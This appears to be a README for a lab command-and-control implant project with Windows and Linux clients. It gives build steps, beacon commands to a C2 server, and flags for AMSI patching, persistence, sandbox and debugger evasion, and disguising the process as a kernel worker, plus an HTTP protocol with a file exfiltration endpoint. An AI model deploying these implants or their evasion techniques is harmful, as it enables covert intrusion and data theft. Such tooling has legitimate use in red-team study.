# C2 Client

Cross-platform C2 implants for the lab environment.

## Implant Variants

| Directory | Language | Target | Binary |
|-----------|----------|--------|--------|
| `windows/` | C# / .NET 8 | Windows x64 | `C2Client.exe` (single-file, self-contained) |
| `linux/` | C++17 | Linux x64 | `c2client` (ELF, links libcurl) |
| `client.py` | Python 3 | Any (study/prototyping) | N/A |
| `client_windows.py` | Python 3 | Windows (study) | N/A |
| `client_linux.py` | Python 3 | Linux (study) | N/A |

## Building

### Windows (.NET)

```powershell
cd windows
dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:PublishTrimmed=true
# Output: bin/Release/net8.0/win-x64/publish/C2Client.exe
```

### Linux (C++)

```bash
cd linux
# Requires: g++, libcurl4-openssl-dev
sudo apt install -y build-essential libcurl4-openssl-dev
make
# Output: ./c2client
```

## Usage

### Windows Native

```powershell
# Basic
.\C2Client.exe --server 10.0.0.1:8000

# Full options
.\C2Client.exe -s 10.0.0.1:8000 -i 10 --persist registry --amsi-bypass --sandbox-check
```

| Flag | Description |
|------|-------------|
| `-s, --server` | C2 address `host:port` (default: `127.0.0.1:8000`) |
| `-i, --interval` | Beacon interval in seconds (default: `10`) |
| `-j, --jitter` | Jitter factor 0–1 (default: `0.3`) |
| `--persist` | `none` / `registry` / `schtask` / `startup` |
| `--amsi-bypass` | Patch AMSI in memory |
| `--sandbox-check` | Exit if VM/sandbox detected |
| `--debug-check` | Exit if debugger attached |

### Linux Native

```bash
# Basic
./c2client --server 10.0.0.1:8000

# Full options
./c2client -s 10.0.0.1:8000 -i 10 --persist crontab --masquerade --container-check
```

| Flag | Description |
|------|-------------|
| `-s, --server` | C2 address `host:port` (default: `127.0.0.1:8000`) |
| `-i, --interval` | Beacon interval in seconds (default: `10`) |
| `-j, --jitter` | Jitter factor 0–1 (default: `0.3`) |
| `--persist` | `none` / `crontab` / `systemd` / `bashrc` |
| `--masquerade` | Rename process to `[kworker/0:2-events]` |
| `--container-check` | Exit if Docker/LXC/VM detected |
| `--trace-check` | Exit if ptrace debugger attached |

## Protocol

All implants use the same HTTP API:

```
POST /api/v1/agent/register          → {"target_id": "..."}
GET  /api/v1/agent/{id}/commands     → {"commands": [{"id":"..","command":".."}]}
POST /api/v1/agent/{id}/commands/{cid}/result  ← {"output": "..."}
POST /api/v1/agent/{id}/exfil        ← {"filename":"..","data_b64":"..","encryption":"aes"}
```

## Architecture

```
┌─────────────────────┐         ┌─────────────────────┐
│  C2Client.exe       │  HTTP   │   C2 Server         │
│  (.NET / Windows)   │────────▶│   (FastAPI)          │
└─────────────────────┘         │                     │
                                │  /api/v1/agent/*    │
┌─────────────────────┐         │                     │
│  c2client           │  HTTP   │  PostgreSQL         │
│  (C++ / Linux)      │────────▶│  (targets, commands)│
└─────────────────────┘         └─────────────────────┘
```
